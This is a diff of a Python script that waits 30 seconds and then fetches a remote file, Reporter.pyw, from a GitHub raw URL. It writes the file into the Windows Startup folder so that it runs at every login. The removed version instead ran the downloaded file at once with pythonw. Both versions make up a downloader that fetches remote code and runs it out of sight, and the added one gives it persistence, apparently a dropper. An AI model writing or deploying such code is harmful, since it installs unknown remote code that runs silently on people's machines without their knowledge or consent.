@@ -4,27 +4,33 @@ import os
 import time
 
 time.sleep(30)
-def download_and_open_file(url, destination_path):
+def download_webpage(url, filename):
     try:
+        # Fetch the webpage content
         response = requests.get(url)
-        response.raise_for_status()  # Raise an HTTPError for bad responses
-
-        with open(destination_path, 'wb') as file:
-            file.write(response.content)
-
-        print(f"File downloaded successfully to {destination_path}")
-
-        # Debug: Print the content of the downloaded file
-        with open(destination_path, 'rb') as file:
-            file_content = file.read()
-            print(f"\nFile content:\n{file_content.decode('utf-8')}")
-
-        # Open the file using the default Python interpreter for .pyw files
-        python_executable = 'pythonw.exe' if os.name == 'nt' else 'pythonw'
-        subprocess.run([python_executable, destination_path])
-
-    except requests.exceptions.RequestException as e:
-        print(f"Error: {e}")
+        if response.status_code == 200:
+            # Get the content of the webpage
+            content = response.text
+            
+            # Get the path to the startup folder
+            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup')
+            
+            # Ensure filename has .py extension
+            if not filename.endswith('.pyw'):
+                filename += '.pyw'
+            
+            # Create the file path
+            file_path = os.path.join(startup_folder, filename)
+            
+            # Write the webpage content to a .py file
+            with open(file_path, 'w') as f:
+                f.write(content)
+                
+            print(f"Webpage content downloaded and saved as '{filename}' in the startup folder.")
+        else:
+            print(f"Failed to download webpage. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
     # Replace the URL with the URL of the .pyw file you want to download
 file_url = "https://raw.githubusercontent.com/Lixvinity/winjv/main/Reporter.pyw"
